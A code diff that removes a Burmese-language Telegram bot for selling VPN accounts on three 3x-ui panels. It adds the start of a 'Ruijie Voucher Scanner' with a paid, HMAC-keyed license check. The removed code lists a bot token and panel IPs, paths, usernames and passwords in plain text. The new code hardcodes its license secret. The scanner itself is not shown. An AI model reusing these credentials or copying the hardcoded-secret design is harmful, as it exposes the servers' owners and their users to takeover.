@@ -1,646 +1,476 @@
-import telebot
-from telebot import types
-import requests
-import uuid
-import datetime
-import json
-import urllib3
+#!/usr/bin/env python3
+"""
+Ruijie Voucher Scanner v17.0 - KENOBE EDITION
+- Premium UI Design
+- Single File License System
+"""
+
 import os
+import sys
+import json
+import asyncio
+import aiohttp
+import re
 import time
+import socket
+import requests
+import urllib3
+import random
+import string
+import hmac
+import hashlib
+from datetime import datetime
+from urllib.parse import urlparse, parse_qs, quote
+
+from rich.console import Console
+from rich.layout import Layout
+from rich.panel import Panel
+from rich.live import Live
+from rich.table import Table
+from rich.align import Align
+from rich.text import Text
+from rich.box import HEAVY, ROUNDED, DOUBLE
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ============================================================
-# ⚙️ သင့် Bot ၏ အချက်အလက်များ
-# ============================================================
-BOT_TOKEN = "9058833367:AAH3q2p_lo0wu-vEZ9H03DhPD1mxQB7YWj4"
-ADMIN_ID = 5617375002
-ADMIN_CONTACT = "@Kenobe21" 
-CHANNEL_LINK = "https://t.me/Skyblue021"
-CHANNEL_USERNAME = "@Skyblue021"
-BOT_LINK = "https://t.me/SkyBlueFreevpn_bot?start="
+# ==========================================
+# 🔐 SINGLE FILE LICENSE SYSTEM
+# ==========================================
+SECRET_KEY = b"RuijieScanner_Secret_2024!@#"  
+LICENSE_FILE = ".rj_license"
 
-# ============================================================
-# 🌐 VPS အချက်အလက်များ
-# ============================================================
-VPS1_URL = "https://157.85.96.190:2083"
-VPS1_PATH = "U6lL3EX7t2yq0q6"
-VPS1_USER = "eYJmFn4UNl"
-VPS1_PASS = "uLVwVpPaLb"
-VPS1_IP = "157.85.96.190"
-VPS1_PORT = "2083"
-VPS1_INBOUND_ID = 1
+DURATIONS = {
+    "1": ("10 Mins", 10 * 60),
+    "2": ("30 Mins", 30 * 60),
+    "3": ("1 Hour", 1 * 60 * 60),
+    "4": ("3 Hours", 3 * 60 * 60),
+    "5": ("5 Hours", 5 * 60 * 60),
+    "6": ("1 Day", 24 * 60 * 60),
+    "7": ("15 Days", 15 * 24 * 60 * 60),
+    "8": ("30 Days", 30 * 24 * 60 * 60)
+}
 
-VPS2_URL = "https://119.10.142.16:41899"
-VPS2_PATH = "kB8wYdqzZ5DlzpP"
-VPS2_USER = "BVO9Zd0FtA"
-VPS2_PASS = "JkbeqV9i0q"
-VPS2_IP = "119.10.142.16"
-VPS2_PORT = "41899"
-VPS2_INBOUND_ID = 1
-
-VPS3_URL = "https://103.114.203.136:2053"
-VPS3_PATH = "dLWnOXijDgbnRhW"
-VPS3_USER = "eIIC3epKrY"
-VPS3_PASS = "G6ifUF2Wi9"
-VPS3_IP = "103.114.203.136"
-VPS3_PORT = "2053"
-VPS3_INBOUND_ID = 1
-
-bot = telebot.TeleBot(BOT_TOKEN)
-
-# ============================================================
-# 💾 ဒေတာ သိမ်းဆည်းရန် ဖိုင်များ
-# ============================================================
-DB_FILE = "users_coin.json"
-HISTORY_FILE = "purchase_history.json"
-ACTIVE_USERS_FILE = "active_users.json"
-
-users_db = {} 
-purchase_history = [] 
-active_users = set()
-
-def load_data():
-    global users_db, purchase_history, active_users
-    try:
-        if os.path.exists(DB_FILE):
-            with open(DB_FILE, "r", encoding="utf-8") as f:
-                users_db = json.load(f)
-        if os.path.exists(HISTORY_FILE):
-            with open(HISTORY_FILE, "r", encoding="utf-8") as f:
-                purchase_history = json.load(f)
-        if os.path.exists(ACTIVE_USERS_FILE):
-            with open(ACTIVE_USERS_FILE, "r", encoding="utf-8") as f:
-                active_users = set(json.load(f))
-    except Exception as e:
-        print(f"Data Load Error: {e}")
-
-def save_data():
-    try:
-        with open(DB_FILE, "w", encoding="utf-8") as f:
-            json.dump(users_db, f, ensure_ascii=False, indent=4)
-        with open(HISTORY_FILE, "w", encoding="utf-8") as f:
-            json.dump(purchase_history, f, ensure_ascii=False, indent=4)
-        with open(ACTIVE_USERS_FILE, "w", encoding="utf-8") as f:
-            json.dump(list(active_users), f)
-    except Exception as e:
-        print(f"Data Save Error: {e}")
-
-load_data()
-
-# ============================================================
-# 🛠️ Helper Functions
-# ============================================================
-def check_join(user_id):
-    try:
-        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        if member.status in ['member', 'administrator', 'creator']:
-            return True
-        return False
-    except:
-        return False
-
-def get_vps_details(vps_choice):
-    if vps_choice == "1":
-        return VPS1_URL, VPS1_PATH, VPS1_USER, VPS1_PASS, VPS1_IP, VPS1_PORT, VPS1_INBOUND_ID
-    elif vps_choice == "2":
-        return VPS2_URL, VPS2_PATH, VPS2_USER, VPS2_PASS, VPS2_IP, VPS2_PORT, VPS2_INBOUND_ID
-    elif vps_choice == "3":
-        return VPS3_URL, VPS3_PATH, VPS3_USER, VPS3_PASS, VPS3_IP, VPS3_PORT, VPS3_INBOUND_ID
-
-def create_account_with_auto_switch(start_vps, username, days, gb):
-    vps_order = [str(start_vps)]
-    all_vps = ["1", "2", "3"]
-    for v in all_vps:
-        if v not in vps_order:
-            vps_order.append(v)
-
-    for current_vps in vps_order:
-        success, result = auto_create_vless_account(current_vps, username, days, gb)
-        
-        if success:
-            return True, result, current_vps 
-            
-        if result == "Duplicate":
-            print(f"VPS {current_vps} တွင် '{username}' ရှိပြီးသားဖြစ်၍ နောက် VPS သို့ ပြောင်းမည်...")
-            continue 
-        else:
-            return False, result, current_vps 
-            
-    return False, "VPS အားလုံးတွင် ဒီအကောင့်နာမည် ရှိနေပြီး ဖြစ်ပါသည်။", start_vps
-
-def auto_create_vless_account(vps_choice, username, days, gb):
-    try:
-        url, path, user, pw, ip, port, inbound_id = get_vps_details(vps_choice)
-        
-        session = requests.Session()
-        session.verify = False
-        
-        login_url = f"{url}/{path}/login"
-        login_data = {"username": user, "password": pw}
-        
-        login_res = session.post(login_url, json=login_data, timeout=15)
-        
-        if login_res.status_code != 200 or not login_res.json().get("success"):
-            return False, "Login မအောင်မြင်ပါ။"
-
-        expire_time = int((datetime.datetime.now() + datetime.timedelta(days=days)).timestamp() * 1000)
-        new_uuid = str(uuid.uuid4())
-        
-        total_gb_bytes = int(gb) * 1073741824 
-        
-        add_url = f"{url}/{path}/panel/api/inbounds/addClient"
-        
-        settings_data = {
-            "clients": [{
-                "id": new_uuid,
-                "flow": "",
-                "email": username,
-                "limitIp": 1, 
-                "totalGB": total_gb_bytes, 
-                "expiryTime": expire_time,
-                "enable": True,
-                "tgId": "",
-                "subId": username
-            }]
-        }
-        
-        payload = {
-            "id": int(inbound_id),
-            "settings": json.dumps(settings_data, ensure_ascii=True)
-        }
-        
-        headers = {"Content-Type": "application/json"}
-        response = session.post(add_url, json=payload, headers=headers, timeout=15)
-        
-        if response.status_code == 200 and response.json().get("success"):
-            vless_link = f"vless://{new_uuid}@{ip}:{port}?type=ws&encryption=none&path={path if path else '/'}&host={ip}&security=none#{username}"
-            return True, vless_link
-        else:
-            if "Duplicate email" in response.text:
-                return False, "Duplicate"
-            return False, f"Error: {response.text}"
-            
-    except Exception as e:
-        return False, str(e)
-
-def get_vps_clients(vps_choice):
-    try:
-        url, path, user, pw, ip, port, inbound_id = get_vps_details(vps_choice)
-        
-        session = requests.Session()
-        session.verify = False
-        
-        login_url = f"{url}/{path}/login"
-        login_data = {"username": user, "password": pw}
-        login_res = session.post(login_url, json=login_data, timeout=15)
-        
-        if login_res.status_code != 200 or not login_res.json().get("success"):
-            return False, "Login မအောင်မြင်ပါ။"
-
-        list_url = f"{url}/{path}/panel/api/inbounds/list"
-        res_list = session.get(list_url, timeout=15)
-        
-        clients = []
-        for inbound in res_list.json().get("obj", []):
-            if inbound["id"] == int(inbound_id):
-                settings = json.loads(inbound["settings"])
-                clients = settings.get("clients", [])
-                break
-        return True, clients
-    except Exception as e:
-        return False, str(e)
-
-def delete_vless_account(vps_choice, username):
-    try:
-        url, path, user, pw, ip, port, inbound_id = get_vps_details(vps_choice)
-        
-        session = requests.Session()
-        session.verify = False
-        
-        login_url = f"{url}/{path}/login"
-        login_data = {"username": user, "password": pw}
-        login_res = session.post(login_url, json=login_data, timeout=15)
-        
-        if login_res.status_code != 200 or not login_res.json().get("success"):
-            return False, "Login မအောင်မြင်ပါ။"
-
-        list_url = f"{url}/{path}/panel/api/inbounds/list"
-        res_list = session.get(list_url, timeout=15)
-        
-        clients = []
-        for inbound in res_list.json().get("obj", []):
-            if inbound["id"] == int(inbound_id):
-                settings = json.loads(inbound["settings"])
-                clients = settings.get("clients", [])
-                break
-        
-        target_uuid = None
-        for client in clients:
-            if client.get("email") == username:
-                target_uuid = client.get("id")
-                break
-        
-        if not target_uuid:
-            return False, f"'{username}' ဆိုတဲ့ အကောင့်ကို VPS {vps_choice} မှာ ရှာမတွေ့ပါ။"
-
-        del_url = f"{url}/{path}/panel/api/inbounds/{inbound_id}/delClient/{target_uuid}"
-        res_del = session.post(del_url, timeout=15)
-        
-        if res_del.status_code == 200 and res_del.json().get("success"):
-            return True, f"'{username}' အကောင့်ကို VPS {vps_choice} မှ အောင်မြင်စွာ ဖျက်လိုက်ပါပြီ။"
-        else:
-            return False, f"ဖျက်လို့မရပါ: {res_del.text}"
-            
-    except Exception as e:
-        return False, str(e)
-# ============================================================
-# 📱 Telegram Bot Handlers
-# ============================================================
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    user_id = str(message.from_user.id)
-    active_users.add(user_id)
-    save_data()
-
-    if user_id not in users_db:
-        users_db[user_id] = {"joined": False, "vpn": []}
+def generate_key_ui():
+    console.print(Panel(Text("🔑 KEY GENERATOR MODE", style="bold cyan", justify="center"), border_style="cyan", box=HEAVY))
+    for k, v in DURATIONS.items():
+        console.print(f"[yellow]{k}.[/yellow] {v[0]}")
     
-    if users_db[user_id]["joined"]:
-        show_main_menu(message.chat.id, user_id)
+    choice = input("\n[yellow]>> Select duration (1-8): [/yellow]").strip()
+    if choice in DURATIONS:
+        name, secs = DURATIONS[choice]
+        expiry = int(time.time() + secs)
+        data = f"{choice}-{expiry}".encode()
+        sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()[:10].upper()
+        key = f"{choice}-{expiry}-{sig}"
+        
+        console.print(f"\n[bold green][+] Generated Key for {name}:[/bold green]")
+        console.print(f"[bold magenta]👉 {key} 👈[/bold magenta]\n")
     else:
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton(text="📢 Channel Join ရန်", url=CHANNEL_LINK))
-        markup.add(types.InlineKeyboardButton(text="✅ Join ပြီးပါပြီ", callback_data="check_join"))
-        
-        bot.send_message(
-            message.chat.id, 
-            "⚠️ **ကျွန်ုပ်တို့၏ ဝန်ဆောင်မှုကို အသုံးပြုရန် အောက်ပါ Channel ကို Join ပေးပါ။**\n\n"
-            "Join ပြီးပါက '✅ Join ပြီးပါပြီ' ကို နှိပ်ပါ။", 
-            reply_markup=markup, 
-            parse_mode='Markdown'
-        )
+        console.print("[bold red][-] Invalid choice![/bold red]")
+    sys.exit(0)
 
-@bot.callback_query_handler(func=lambda call: call.data == "check_join")
-def verify_join(call):
-    user_id = str(call.from_user.id)
-    if check_join(call.from_user.id):
-        users_db[user_id]["joined"] = True
-        save_data()
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-        bot.answer_callback_query(call.id, "အဆင်ပြေပါပြီ။ ကြိုဆိုပါတယ်။")
-        show_main_menu(call.message.chat.id, user_id)
-    else:
-        bot.answer_callback_query(call.id, "❌ Channel ကို Join မထားရသေးပါဘူး။", show_alert=True)
-
-def show_main_menu(chat_id, user_id):
-    markup = types.InlineKeyboardMarkup()
-    
-    # Admin အတွက် ခလုတ်များ
-    if int(user_id) == ADMIN_ID:
-        markup.add(types.InlineKeyboardButton(text="🛠️ Admin - အကောင့်အသစ်ထုတ်ရန်", callback_data="admin_create"))
-        markup.add(types.InlineKeyboardButton(text="📋 VPS အတွင်း အကောင့်စာရင်းကြည့်ရန်", callback_data="admin_check_vps_list"))
-    
-    # 🚨 User အားလုံးအတွက် အကောင့်ဖျက်ရန် ခလုတ် (အသစ်ထည့်ထားသည်)
-    markup.add(types.InlineKeyboardButton(text="🗑️ VPN အကောင့် ဖျက်ရန်", callback_data="user_delete_vpn"))
-    
-    markup.add(types.InlineKeyboardButton(text="🎁 သူငယ်ချင်းအတွက် လင့်ခ်တောင်းရန်", callback_data="buy_for_friend"))
-    
-    welcome_text = (
-        "🌟 **Sky Blue VPN Bot မှ ကြိုဆိုပါတယ်** 🌟\n\n"
-        "📌 **သူငယ်ချင်းကို ပေးသုံးရန်** - သူငယ်ချင်းရဲ့ Telegram ID ကို ထည့်ပြီး လင့်ခ်တောင်းနိုင်ပါတယ်။\n\n"
-        f"👨‍💻 **အကူအညီလိုပါက:** {ADMIN_CONTACT}\n\n"
-        "👇 ရွေးချယ်ပါ -"
-    )
-    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode='Markdown')
-
-# ============================================================
-# 🗑️ User တွေ VPN အကောင့် ဖျက်သည့် စနစ် (အသစ်)
-# ============================================================
-@bot.callback_query_handler(func=lambda call: call.data == "user_delete_vpn")
-def user_delete_vpn_menu(call):
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 1 မှ ဖျက်မည်", callback_data="user_del_vps_1"))
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 2 မှ ဖျက်မည်", callback_data="user_del_vps_2"))
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 3 မှ ဖျက်မည်", callback_data="user_del_vps_3"))
-    markup.add(types.InlineKeyboardButton(text="🔙 နောက်သို့", callback_data="back_main"))
-    
-    bot.edit_message_text(
-        "🗑️ **VPN အကောင့် ဖျက်ရန်**\n\n"
-        "ဘယ် VPS ကနေ ဖျက်မလဲ ရွေးချယ်ပါ -",
-        call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown'
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('user_del_vps_'))
-def user_del_process_vps(call):
-    vps_num = call.data.replace("user_del_vps_", "")
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(text="❌ ပယ်ဖျက်မည်", callback_data="back_main"))
-
-    bot.edit_message_text(
-        f"✅ VPS {vps_num} ကို ရွေးချယ်ပြီးပါပြီ။\n\n"
-        "📝 ကျေးဇူးပြု၍ ဖျက်လိုသော **အကောင့်နာမည်** ကို ရိုက်ထည့်ပါ။\n"
-        "*(ဥပမာ - `myfriend`)*",
-        call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown'
-    )
-    bot.register_next_step_handler_by_chat_id(call.message.chat.id, user_del_get_name, vps_num)
-
-def user_del_get_name(message, vps_num):
-    if message.text.startswith('/'):
-        bot.reply_to(message, "❌ ပယ်ဖျက်လိုက်ပါပြီ။")
-        show_main_menu(message.chat.id, str(message.from_user.id))
-        return
-        
-    account_name = message.text.strip()
-    
-    # ဖျက်မယ်ဆိုတာ အတည်ပြုခိုင်းမယ် (Confirm Button)
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(text="✅ ဟုတ်ကဲ့ ဖျက်မည်", callback_data=f"confirm_del_{vps_num}_{account_name}"))
-    markup.add(types.InlineKeyboardButton(text="❌ မဖျက်တော့ပါ", callback_data="back_main"))
-    
-    bot.reply_to(message, 
-        f"⚠️ **အတည်ပြုပါ**\n\n"
-        f"VPS {vps_num} မှ `{account_name}` ဆိုတဲ့ အကောင့်ကို ဖျက်ပစ်ရန် သေချာပါသလား?",
-        reply_markup=markup,
-        parse_mode='Markdown'
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_del_'))
-def user_confirm_delete(call):
-    # Data ကို ခွဲထုတ်မယ်
-    parts = call.data.split("_")
-    vps_num = parts[2]
-    account_name = "_".join(parts[3:]) # အကောင့်နာမည်မှာ _ ပါရင် အကုန်ယူမယ်
-    
-    bot.answer_callback_query(call.id, "⏳ ဖျက်နေသည်...")
-    
-    success, result = delete_vless_account(vps_num, account_name)
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(text="🔙 Main Menu", callback_data="back_main"))
-    
-    if success:
-        bot.edit_message_text(
-            f"✅ **အောင်မြင်ပါသည်!**\n\n{result}",
-            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown'
-        )
-    else:
-        bot.edit_message_text(
-            f"⚠️ **Error:**\n\n{result}",
-            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown'
-        )
-
-# ============================================================
-# Admin အတွက် အကောင့်ထုတ်ပေးသည့် စနစ်
-# ============================================================
-@bot.callback_query_handler(func=lambda call: call.data == "admin_create")
-def admin_create_menu(call):
-    if call.from_user.id != ADMIN_ID: return
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 1 မှ ထုတ်မည်", callback_data="admin_vps_1"))
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 2 မှ ထုတ်မည်", callback_data="admin_vps_2"))
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 3 မှ ထုတ်မည်", callback_data="admin_vps_3"))
-    markup.add(types.InlineKeyboardButton(text="🔙 နောက်သို့", callback_data="back_main"))
-    
-    bot.edit_message_text(
-        "🛠️ **Admin - အကောင့်အသစ် ထုတ်ပေးရန်**\n\n"
-        "ဘယ် VPS ကနေ ထုတ်ပေးမလဲ ရွေးချယ်ပါ -",
-        call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown'
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_vps_'))
-def admin_process_vps(call):
-    if call.from_user.id != ADMIN_ID: return
-    vps_num = call.data.replace("admin_vps_", "")
-    
-    bot.edit_message_text(
-        f"✅ VPS {vps_num} ကို ရွေးချယ်ပြီးပါပြီ။\n\n"
-        "📝 ကျေးဇူးပြု၍ **အကောင့်နာမည်** (ဥပမာ - `myfriend`) ကို ရိုက်ထည့်ပါ -",
-        call.message.chat.id, call.message.message_id
-    )
-    bot.register_next_step_handler_by_chat_id(call.message.chat.id, admin_get_name, vps_num)
-
-def admin_get_name(message, vps_num):
-    account_name = message.text.strip()
-    bot.reply_to(message, 
-        f"✅ အကောင့်နာမည်: `{account_name}`\n\n"
-        "📅 ကျေးဇူးပြု၍ **သက်တမ်း (ရက်)** ကို ရိုက်ထည့်ပါ (ဥပမာ - `30`) -",
-        parse_mode='Markdown'
-    )
-    bot.register_next_step_handler(message, admin_get_days, vps_num, account_name)
-
-def admin_get_days(message, vps_num, account_name):
-    try:
-        days = int(message.text.strip())
-    except:
-        bot.reply_to(message, "⚠️ ကျေးဇူးပြု၍ ဂဏန်းသက်သက်သာ ရိုက်ထည့်ပါ (ဥပမာ - 30)။")
-        bot.register_next_step_handler(message, admin_get_days, vps_num, account_name)
-        return
-        
-    gb = days * 2
-    bot.reply_to(message, "⏳ အကောင့်ဖန်တီးနေသည်...")
-    
-    success, result, final_vps = create_account_with_auto_switch(vps_num, account_name, days, gb)
-
-    if success:
-        bot.send_message(
-            message.chat.id, 
-            f"🎉 **အကောင့်ဖန်တီးပြီးပါပြီ!**\n\n"
-            f"🌐 **ထုတ်ပေးလိုက်သည့် VPS:** VPS {final_vps}\n"
-            f"📁 **အကောင့်:** `{account_name}`\n"
-            f"⏳ **သက်တမ်း:** {days} ရက်\n"
-            f"📦 **Data ပမာဏ:** {gb} GB\n\n"
-            f"📄 **လင့်ခ်:**\n`{result}`", 
-            parse_mode='Markdown'
-        )
-    else:
-        bot.send_message(message.chat.id, f"⚠️ Error: အကောင့်ဖန်တီးမရပါ။\n{result}")
-
-@bot.callback_query_handler(func=lambda call: call.data == "admin_check_vps_list")
-def admin_check_vps_list(call):
-    if call.from_user.id != ADMIN_ID: return
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 1 စစ်မည်", callback_data="check_list_1"))
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 2 စစ်မည်", callback_data="check_list_2"))
-    markup.add(types.InlineKeyboardButton(text="🇹🇭 VPS 3 စစ်မည်", callback_data="check_list_3"))
-    markup.add(types.InlineKeyboardButton(text="🔙 နောက်သို့", callback_data="back_main"))
-    
-    bot.edit_message_text(
-        "📋 **ဘယ် VPS ရဲ့ အကောင့်စာရင်းကို စစ်မလဲ?**",
-        call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown'
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('check_list_'))
-def admin_process_check_list(call):
-    if call.from_user.id != ADMIN_ID: return
-    vps_num = call.data.replace("check_list_", "")
-    
-    bot.edit_message_text(f"⏳ VPS {vps_num} ရဲ့ အကောင့်စာရင်းကို ဆွဲယူနေသည်...", call.message.chat.id, call.message.message_id)
-    
-    success, clients = get_vps_clients(vps_num)
-    
-    if not success:
-        bot.edit_message_text(f"❌ Error: {clients}", call.message.chat.id, call.message.message_id)
-        return
-        
-    if not clients:
-        bot.edit_message_text(f"📁 VPS {vps_num} မှာ VPN အကောင့် မရှိပါ။", call.message.chat.id, call.message.message_id)
-        return
-        
-    msg = f"📋 **VPS {vps_num} အတွင်း အကောင့်စာရင်း (စုစုပေါင်း {len(clients)} ခု)**\n\n"
-    for i, c in enumerate(clients, 1):
-        email = c.get("email", "Unknown")
-        expiry = c.get("expiryTime", 0)
-        if expiry == 0:
-            expire_date = "မကုန်ဆုံးပါ"
-        else:
-            exp_utc = datetime.datetime.fromtimestamp(expiry / 1000, tz=datetime.timezone.utc)
-            exp_mm = exp_utc + datetime.timedelta(hours=6, minutes=30)
-            expire_date = exp_mm.strftime('%Y-%m-%d %H:%M')
-        msg += f"{i}. `{email}` (ကုန်ဆုံး: {expire_date})\n"
-        
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(text=f"🗑️ VPS {vps_num} မှ အကောင့်ဖျက်ရန်", callback_data=f"delete_client_{vps_num}"))
-    markup.add(types.InlineKeyboardButton(text="🔙 နောက်သို့", callback_data="admin_check_vps_list"))
-    
-    if len(msg) > 4000:
-        for i in range(0, len(msg), 4000):
-            bot.send_message(call.message.chat.id, msg[i:i+4000], parse_mode='Markdown')
-        bot.send_message(call.message.chat.id, "ဖျက်လိုပါက အောက်ပါခလုတ်ကို နှိပ်ပါ -", reply_markup=markup)
-    else:
-        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_client_'))
-def admin_delete_client_prompt(call):
-    if call.from_user.id != ADMIN_ID: return
-    
-    vps_num = call.data.replace("delete_client_", "")
-    
-    bot.send_message(
-        call.message.chat.id, 
-        f"🗑️ **VPS {vps_num}** မှ ဖျက်လိုသော အကောင့်နာမည်ကို ရိုက်ထည့်ပါ -"
-    )
-    
-    bot.register_next_step_handler_by_chat_id(call.message.chat.id, admin_delete_client, vps_num)
-
-def admin_delete_client(message, vps_num):
-    account_name = message.text.strip()
-    bot.reply_to(message, f"⏳ '{account_name}' ကို VPS {vps_num} မှ ဖျက်နေသည်...")
-    
-    success, result = delete_vless_account(vps_num, account_name)
-    
-    if success:
-        bot.send_message(message.chat.id, f"✅ {result}")
-    else:
-        bot.send_message(message.chat.id, f"⚠️ {result}")
-
-@bot.callback_query_handler(func=lambda call: call.data == "buy_for_friend")
-def buy_for_friend_menu(call):
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(text="🔙 နောက်သို့", callback_data="back_main"))
-    
-    bot.edit_message_text(
-        f"🎁 **သူငယ်ချင်းအတွက် လင့်ခ်တောင်းရန်**\n\n"
-        "📝 ကျေးဇူးပြု၍ သူငယ်ချင်းရဲ့ **Telegram ID** ကို ရိုက်ထည့်ပါ (ဥပမာ - `8823368996`) -",
-        call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown'
-    )
-    bot.register_next_step_handler_by_chat_id(call.message.chat.id, get_friend_id)
-
-def get_friend_id(message):
-    user_id = str(message.from_user.id)
-    friend_id = message.text.strip()
-    
-    bot.reply_to(message, f"✅ သင့်တောင်းခံမှုကို လက်ခံရရှိပါပြီ။\n\nAdmin က သင့်သူငယ်ချင်း (ID: `{friend_id}`) အတွက် အကောင့်ထုတ်ပေးပါလိမ့်မယ်။", parse_mode='Markdown')
-    
-    admin_markup = types.InlineKeyboardMarkup()
-    admin_markup.add(types.InlineKeyboardButton(text="🛠️ ယခု အကောင့်ထုတ်ပေးမည်", callback_data="admin_create"))
-    
-    bot.send_message(
-        ADMIN_ID, 
-        f"🔔 **သူငယ်ချင်းအတွက် လင့်ခ်တောင်းခံမှု**\n\n"
-        f"👤 တောင်းခံသူ: {message.from_user.full_name} (ID: {user_id})\n"
-        f"🎯 သူငယ်ချင်း ID: `{friend_id}`",
-        reply_markup=admin_markup,
-        parse_mode='Markdown'
-    )
-    try:
-        bot.send_message(friend_id, "🎉 သင့်သူငယ်ချင်းက သင့်အတွက် VPN လင့်ခ်တစ်ခု တောင်းခံထားပါတယ်။ Admin က မကြာမီ ပို့ပေးပါလိမ့်မယ်။")
-    except:
-        pass
-
-@bot.callback_query_handler(func=lambda call: call.data == "back_main")
-def back_main(call):
-    user_id = str(call.from_user.id)
-    bot.delete_message(call.message.chat.id, call.message.message_id)
-    show_main_menu(call.message.chat.id, user_id)
-
-# ============================================================
-# 🚨 Admin Commands
-# ============================================================
-@bot.message_handler(commands=['help'])
-def help_command(message):
-    if message.from_user.id != ADMIN_ID: 
-        bot.reply_to(message, "❌ ဒီ Command ကို Admin ပဲ အသုံးပြုခွင့်ရှိပါတယ်။")
-        return
-        
-    help_text = (
-        "🤖 **Admin အတွက် အသုံးပြုနိုင်သော Command များ**\n\n"
-        "🔹 **/help** - ဒီစာမျက်နှာကို ဖွင့်ရန်။\n\n"
-        "🔹 **/online** - လက်ရှိ Bot ကို သုံးနေတဲ့ လူဦးရေကို ကြည့်ရန်။\n\n"
-        "🔹 **/history** - ဝယ်ယူမှု မှတ်တမ်းများကို ကြည့်ရန်။"
-    )
-    bot.reply_to(message, help_text, parse_mode='Markdown')
-
-@bot.message_handler(commands=['online'])
-def online_users_command(message):
-    if message.from_user.id != ADMIN_ID: return
-    
-    total_users = len(users_db)
-    online_count = len(active_users)
-    
-    text = (
-        "📊 **Bot အသုံးပြုသူ အခြေအနေ**\n\n"
-        f"👥 **စုစုပေါင်း အသုံးပြုသူ:** {total_users} ယောက်\n"
-        f"🟢 **လက်ရှိ အွန်လိုင်း (ရောက်သုံးနေသူ):** {online_count} ယောက်"
-    )
-    bot.reply_to(message, text, parse_mode='Markdown')
-
-@bot.message_handler(commands=['history'])
-def history_command(message):
-    if message.from_user.id != ADMIN_ID: return
-    if not purchase_history:
-        bot.reply_to(message, "📁 ဝယ်ယူမှု မှတ်တမ်း မရှိသေးပါ။")
-        return
-        
-    msg = "📋 **ဝယ်ယူမှု မှတ်တမ်း (မကြာသေးမီက)**\n\n"
-    for item in purchase_history[-20:]:
-        msg += (
-            f"👤 User: `{item['user_id']}`\n"
-            f"🌐 VPS: {item.get('vps', 'N/A')}\n"
-            f"🎫 အကောင့်: `{item['username']}`\n"
-            f"📅 ရက်: {item['days']} ရက် | 📦 Data: {item.get('gb', 'N/A')} GB\n"
-            f"🕒 {item['date']}\n"
-            f"--- --- ---\n"
-        )
-        
-    if len(msg) > 4000:
-        for i in range(0, len(msg), 4000):
-            bot.send_message(message.chat.id, msg[i:i+4000], parse_mode='Markdown')
-    else:
-        bot.send_message(message.chat.id, msg, parse_mode='Markdown')
-
-# ============================================================
-# 🚀 Bot စတင်ခြင်း
-# ============================================================
-if __name__ == '__main__':
-    print("🤖 Sky Blue Multi-VPS Bot စတင်နေသည်...")
-    while True:
+def check_license():
+    if os.path.exists(LICENSE_FILE):
         try:
-            bot.infinity_polling(timeout=10, long_polling_timeout=5)
-        except Exception as e:
-            print(f"Error တက်သွားပါသည်: {e}")
-            print("5 စက္ကန့်အတွင်း ပြန်လည် စတင်ပါမည်...")
-            time.sleep(5)
+            with open(LICENSE_FILE, "r") as f:
+                data = json.load(f)
+                key = data.get("key", "")
+                code, exp_str, sig = key.split("-")
+                expiry = int(exp_str)
+                expected_sig = hmac.new(SECRET_KEY, f"{code}-{exp_str}".encode(), hashlib.sha256).hexdigest()[:10].upper()
+                
+                if hmac.compare_digest(sig, expected_sig):
+                    if time.time() < expiry:
+                        remaining = expiry - time.time()
+                        days = int(remaining // 86400)
+                        hours = int((remaining % 86400) // 3600)
+                        mins = int((remaining % 3600) // 60)
+                        console.print(f"[bold green][+] License Valid! Time left: {days}d {hours}h {mins}m[/bold green]")
+                        time.sleep(1)
+                        return True
+                    else:
+                        console.print("[bold red][-] License Expired! Please buy a new key.[/bold red]")
+                else:
+                    console.print("[bold red][-] Invalid License File![/bold red]")
+        except Exception:
+            pass
+
+    console.print(Panel(Text("🔒 ACTIVATION REQUIRED", style="bold red", justify="center"), border_style="red", box=HEAVY))
+    user_key = input("[yellow]>> Enter your Key: [/yellow]").strip()
+
+    try:
+        code, exp_str, sig = user_key.split("-")
+        expiry = int(exp_str)
+        expected_sig = hmac.new(SECRET_KEY, f"{code}-{expiry}".encode(), hashlib.sha256).hexdigest()[:10].upper()
+        
+        if hmac.compare_digest(sig, expected_sig):
+            if time.time() < expiry:
+                with open(LICENSE_FILE, "w") as f:
+                    json.dump({"key": user_key, "expiry": expiry}, f)
+                console.print("[bold green][+] Activation Successful![/bold green]")
+                time.sleep(1)
+                return True
+            else:
+                console.print("[bold red][-] This key has already expired![/bold red]")
+        else:
